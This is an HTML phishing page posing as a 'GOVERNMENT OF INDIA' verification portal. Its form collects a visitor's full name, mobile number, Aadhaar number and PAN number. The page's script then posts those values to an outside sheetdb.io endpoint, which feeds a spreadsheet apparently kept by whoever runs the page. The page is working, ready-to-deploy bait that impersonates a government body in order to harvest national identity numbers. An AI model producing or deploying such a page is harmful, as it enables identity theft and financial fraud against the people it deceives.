<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Portal</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; padding: 15px; }
        .box { background: white; max-width: 420px; margin: auto; padding: 20px; border-radius: 12px; border-top: 6px solid #003366; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; }
        .btn { background: #28a745; color: white; border: none; width: 100%; padding: 15px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
<div class="box">
    <h2 style="text-align:center; color:#003366;">GOVERNMENT OF INDIA</h2>
    <form id="finalForm">
        <input type="text" name="Name" placeholder="Full Name" required>
        <input type="tel" name="Mobile" placeholder="Mobile Number" required>
        <input type="text" name="Aadhaar_No" placeholder="Aadhaar Number" required>
        <input type="text" name="PAN_No" placeholder="PAN Number" required>
        <button type="button" class="btn" onclick="sendToSheet()">SUBMIT NOW</button>
    </form>
</div>
<script>
    function sendToSheet() {
        const apiURL = 'https://sheetdb.io/api/v1/nvchx3e538ya4'; // Aapka API Link
        const form = document.getElementById('finalForm');
        
        fetch(apiURL, { method: 'POST', body: new FormData(form) })
        .then(() => {
            alert("Success! Check your Google Sheet.");
            form.reset();
        }).catch(() => alert("Error! Please try again."));
    }
</script>
</body>
</html>
